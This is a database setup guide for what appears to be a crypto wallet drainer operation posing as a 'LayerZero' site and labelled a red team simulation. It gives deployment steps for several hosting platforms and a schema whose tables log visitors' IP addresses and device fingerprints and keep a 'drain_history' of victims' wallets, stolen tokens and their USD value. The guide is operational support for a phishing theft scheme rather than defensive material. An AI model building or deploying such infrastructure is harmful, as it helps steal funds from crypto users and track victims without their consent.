# Database Setup Guide

## [RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]

**Updated**: August 29, 2025  
**Status**: ✅ Production Ready

This guide provides comprehensive database setup instructions for various hosting platforms to enable persistent storage of operation settings, visitor logs, and drain history.

## Database Options

### 1. SQLite (Recommended for Development)
- **Pros**: No setup required, file-based, perfect for development
- **Cons**: Limited concurrent connections, not suitable for high traffic
- **Best for**: Development, testing, small deployments

### 2. MySQL (Recommended for Production)
- **Pros**: Widely supported, reliable, good performance
- **Cons**: Requires separate server setup
- **Best for**: Production deployments, shared hosting

### 3. PostgreSQL (Advanced)
- **Pros**: Advanced features, excellent performance, ACID compliance
- **Cons**: More complex setup, higher resource usage
- **Best for**: Enterprise deployments, high-traffic applications

## Platform-Specific Setup

### 1. Local Development Setup

#### SQLite Setup (Easiest)
```bash
# Install SQLite
# Windows: Download from https://www.sqlite.org/download.html
# macOS: brew install sqlite3
# Linux: sudo apt-get install sqlite3

# Create database directory
mkdir data
touch data/operations.db

# Set environment variables
DB_TYPE=sqlite
DATABASE_URL=./data/operations.db
```

#### MySQL Setup (Local)
```bash
# Install MySQL
# Windows: Download MySQL Installer
# macOS: brew install mysql
# Linux: sudo apt-get install mysql-server

# Start MySQL service
sudo systemctl start mysql

# Create database and user
mysql -u root -p
CREATE DATABASE layerzero_ops;
CREATE USER 'layerzero_user'@'localhost' IDENTIFIED BY 'your_password';
GRANT ALL PRIVILEGES ON layerzero_ops.* TO 'layerzero_user'@'localhost';
FLUSH PRIVILEGES;
EXIT;

# Set environment variables
DB_TYPE=mysql
DATABASE_URL=mysql://layerzero_user:your_password@localhost:3306/layerzero_ops
```

### 2. Shared Hosting Setup

#### cPanel Hosting (Hostinger, GoDaddy, etc.)

**Step 1: Access cPanel**
1. Login to your hosting control panel
2. Navigate to "Databases" section
3. Click "MySQL Databases"

**Step 2: Create Database**
1. Enter database name: `layerzero_ops`
2. Click "Create Database"
3. Note the full database name (usually `username_layerzero_ops`)

**Step 3: Create Database User**
1. Enter username: `layerzero_user`
2. Enter strong password
3. Click "Create User"
4. Note the full username (usually `username_layerzero_user`)

**Step 4: Assign User to Database**
1. Select your database and user
2. Grant "ALL PRIVILEGES"
3. Click "Add"

**Step 5: Configure Environment**
```bash
DB_TYPE=mysql
DATABASE_URL=mysql://username_layerzero_user:password@localhost:3306/username_layerzero_ops
```

#### Plesk Hosting
1. Access Plesk control panel
2. Go to "Databases" > "MySQL"
3. Create new database and user
4. Follow same steps as cPanel

### 3. Cloud Platform Setup

#### Vercel Deployment

**Step 1: Set up Vercel**
```bash
# Install Vercel CLI
npm i -g vercel

# Login to Vercel
vercel login

# Deploy project
vercel
```

**Step 2: Configure Database**
1. Go to [Vercel Dashboard](https://vercel.com/dashboard)
2. Select your project
3. Go to "Settings" > "Environment Variables"
4. Add database variables:
   ```
   DB_TYPE=postgresql
   DATABASE_URL=postgresql://user:password@host:port/database
   ```

**Step 3: Use Vercel Postgres (Recommended)**
1. In Vercel dashboard, go to "Storage"
2. Click "Create Database"
3. Select "Postgres"
4. Choose plan and region
5. Copy connection string to environment variables

#### Railway Deployment

**Step 1: Set up Railway**
```bash
# Install Railway CLI
npm i -g @railway/cli

# Login to Railway
railway login

# Initialize project
railway init
```

**Step 2: Add Database**
1. Go to [Railway Dashboard](https://railway.app/dashboard)
2. Create new project
3. Click "New Service" > "Database"
4. Choose MySQL or PostgreSQL
5. Copy connection string

**Step 3: Configure Environment**
```bash
# Add environment variables
railway variables set DB_TYPE=mysql
railway variables set DATABASE_URL=mysql://user:password@host:port/database
```

#### Render Deployment

**Step 1: Set up Render**
1. Go to [Render Dashboard](https://render.com/dashboard)
2. Click "New" > "Web Service"
3. Connect your GitHub repository

**Step 2: Add Database**
1. Click "New" > "PostgreSQL"
2. Choose plan and region
3. Copy connection string

**Step 3: Configure Environment**
1. Go to your web service
2. Click "Environment"
3. Add variables:
   ```
   DB_TYPE=postgresql
   DATABASE_URL=postgresql://user:password@host:port/database
   ```

#### Fly.io Deployment

**Step 1: Set up Fly.io**
```bash
# Install Fly CLI
curl -L https://fly.io/install.sh | sh

# Login to Fly
fly auth login

# Launch app
fly launch
```

**Step 2: Add Database**
```bash
# Create PostgreSQL database
fly postgres create layerzero-db

# Attach to app
fly postgres attach layerzero-db --app your-app-name
```

**Step 3: Configure Environment**
```bash
# Set environment variables
fly secrets set DB_TYPE=postgresql
fly secrets set DATABASE_URL=postgresql://user:password@host:port/database
```

### 4. Database Schema Setup

Create a database initialization script:

```javascript
// database/init.js
const sqlite3 = require('sqlite3').verbose();
const mysql = require('mysql2/promise');
const { Pool } = require('pg');

async function initializeDatabase() {
    const dbType = process.env.DB_TYPE || 'sqlite';
    
    if (dbType === 'sqlite') {
        await initSQLite();
    } else if (dbType === 'mysql') {
        await initMySQL();
    } else if (dbType === 'postgresql') {
        await initPostgreSQL();
    }
}

async function initSQLite() {
    const db = new sqlite3.Database(process.env.DATABASE_URL);
    
    await db.run(`
        CREATE TABLE IF NOT EXISTS operation_settings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            setting_key TEXT UNIQUE NOT NULL,
            setting_value TEXT NOT NULL,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await db.run(`
        CREATE TABLE IF NOT EXISTS visitor_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT NOT NULL,
            device_fingerprint TEXT,
            user_agent TEXT,
            path TEXT NOT NULL,
            method TEXT NOT NULL,
            referer TEXT,
            language TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await db.run(`
        CREATE TABLE IF NOT EXISTS drain_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            wallet_address TEXT NOT NULL,
            token_address TEXT NOT NULL,
            token_symbol TEXT NOT NULL,
            amount TEXT NOT NULL,
            value_usd REAL,
            tx_hash TEXT,
            chain TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await db.run(`
        CREATE TABLE IF NOT EXISTS admin_activity (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            action TEXT NOT NULL,
            details TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    console.log('SQLite database initialized successfully');
}

async function initMySQL() {
    const connection = await mysql.createConnection(process.env.DATABASE_URL);
    
    await connection.execute(`
        CREATE TABLE IF NOT EXISTS operation_settings (
            id INT AUTO_INCREMENT PRIMARY KEY,
            setting_key VARCHAR(255) UNIQUE NOT NULL,
            setting_value TEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        )
    `);
    
    await connection.execute(`
        CREATE TABLE IF NOT EXISTS visitor_logs (
            id INT AUTO_INCREMENT PRIMARY KEY,
            ip_address VARCHAR(45) NOT NULL,
            device_fingerprint VARCHAR(255),
            user_agent TEXT,
            path VARCHAR(255) NOT NULL,
            method VARCHAR(10) NOT NULL,
            referer TEXT,
            language VARCHAR(10),
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await connection.execute(`
        CREATE TABLE IF NOT EXISTS drain_history (
            id INT AUTO_INCREMENT PRIMARY KEY,
            wallet_address VARCHAR(42) NOT NULL,
            token_address VARCHAR(42) NOT NULL,
            token_symbol VARCHAR(10) NOT NULL,
            amount DECIMAL(65,18) NOT NULL,
            value_usd DECIMAL(15,2),
            tx_hash VARCHAR(66),
            chain VARCHAR(20),
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await connection.execute(`
        CREATE TABLE IF NOT EXISTS admin_activity (
            id INT AUTO_INCREMENT PRIMARY KEY,
            action VARCHAR(100) NOT NULL,
            details TEXT,
            ip_address VARCHAR(45),
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await connection.end();
    console.log('MySQL database initialized successfully');
}

async function initPostgreSQL() {
    const pool = new Pool({ connectionString: process.env.DATABASE_URL });
    
    await pool.query(`
        CREATE TABLE IF NOT EXISTS operation_settings (
            id SERIAL PRIMARY KEY,
            setting_key VARCHAR(255) UNIQUE NOT NULL,
            setting_value TEXT NOT NULL,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await pool.query(`
        CREATE TABLE IF NOT EXISTS visitor_logs (
            id SERIAL PRIMARY KEY,
            ip_address INET NOT NULL,
            device_fingerprint VARCHAR(255),
            user_agent TEXT,
            path VARCHAR(255) NOT NULL,
            method VARCHAR(10) NOT NULL,
            referer TEXT,
            language VARCHAR(10),
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await pool.query(`
        CREATE TABLE IF NOT EXISTS drain_history (
            id SERIAL PRIMARY KEY,
            wallet_address VARCHAR(42) NOT NULL,
            token_address VARCHAR(42) NOT NULL,
            token_symbol VARCHAR(10) NOT NULL,
            amount NUMERIC(65,18) NOT NULL,
            value_usd NUMERIC(15,2),
            tx_hash VARCHAR(66),
            chain VARCHAR(20),
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await pool.query(`
        CREATE TABLE IF NOT EXISTS admin_activity (
            id SERIAL PRIMARY KEY,
            action VARCHAR(100) NOT NULL,
            details TEXT,
            ip_address INET,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    await pool.end();
    console.log('PostgreSQL database initialized successfully');
}

module.exports = { initializeDatabase };
```

### 5. Database Integration

Update your `server.js` to use the database:

```javascript
// Add to server.js
const { initializeDatabase } = require('./database/init');

// Initialize database on startup
initializeDatabase().catch(console.error);

// Database helper functions
async function saveSetting(key, value) {
    // Implementation depends on your database choice
}

async function getSetting(key) {
    // Implementation depends on your database choice
}

async function logVisitor(visitorData) {
    // Implementation depends on your database choice
}

async function logDrain(drainData) {
    // Implementation depends on your database choice
}
```

## Security Considerations

### 1. Database Security
- Use strong passwords for database users
- Restrict database access to application IP only
- Enable SSL/TLS for database connections
- Regular database backups
- Encrypt sensitive data at rest

### 2. Environment Variables
- Never commit database credentials to version control
- Use environment-specific configuration
- Rotate database passwords regularly
- Use connection pooling for better performance

### 3. Backup Strategy
```bash
# SQLite backup
cp data/operations.db data/operations.db.backup

# MySQL backup
mysqldump -u username -p database_name > backup.sql

# PostgreSQL backup
pg_dump database_name > backup.sql
```

## Performance Optimization

### 1. Indexing
```sql
-- Add indexes for better performance
CREATE INDEX idx_visitor_logs_timestamp ON visitor_logs(timestamp);
CREATE INDEX idx_drain_history_wallet ON drain_history(wallet_address);
CREATE INDEX idx_drain_history_timestamp ON drain_history(timestamp);
```

### 2. Connection Pooling
```javascript
// For MySQL
const mysql = require('mysql2/promise');
const pool = mysql.createPool({
    connectionString: process.env.DATABASE_URL,
    connectionLimit: 10,
    acquireTimeout: 60000,
    timeout: 60000
});

// For PostgreSQL
const { Pool } = require('pg');
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 2000
});
```

## Troubleshooting

### Common Issues:

1. **Connection Refused**
   - Check database service is running
   - Verify connection string format
   - Check firewall settings

2. **Authentication Failed**
   - Verify username/password
   - Check user privileges
   - Ensure database exists

3. **Permission Denied**
   - Check file permissions (SQLite)
   - Verify user has CREATE TABLE privileges
   - Check database user permissions

4. **Connection Timeout**
   - Increase connection timeout
   - Check network connectivity
   - Verify database server is accessible

### Testing Database Connection:

```javascript
// Test database connection
async function testConnection() {
    try {
        const dbType = process.env.DB_TYPE;
        if (dbType === 'sqlite') {
            const db = new sqlite3.Database(process.env.DATABASE_URL);
            await db.run('SELECT 1');
            console.log('SQLite connection successful');
        } else if (dbType === 'mysql') {
            const connection = await mysql.createConnection(process.env.DATABASE_URL);
            await connection.execute('SELECT 1');
            console.log('MySQL connection successful');
        } else if (dbType === 'postgresql') {
            const pool = new Pool({ connectionString: process.env.DATABASE_URL });
            await pool.query('SELECT 1');
            console.log('PostgreSQL connection successful');
        }
    } catch (error) {
        console.error('Database connection failed:', error);
    }
}
```

## Migration Guide

### From SQLite to MySQL/PostgreSQL:

1. Export data from SQLite
2. Create new database
3. Import data to new database
4. Update environment variables
5. Test all functionality

### Backup and Restore:

```bash
# Backup current data
node scripts/backup.js

# Restore from backup
node scripts/restore.js backup_file.sql
```

This comprehensive database setup guide ensures your LayerZero simulation can scale from development to production across various hosting platforms while maintaining data persistence and security.
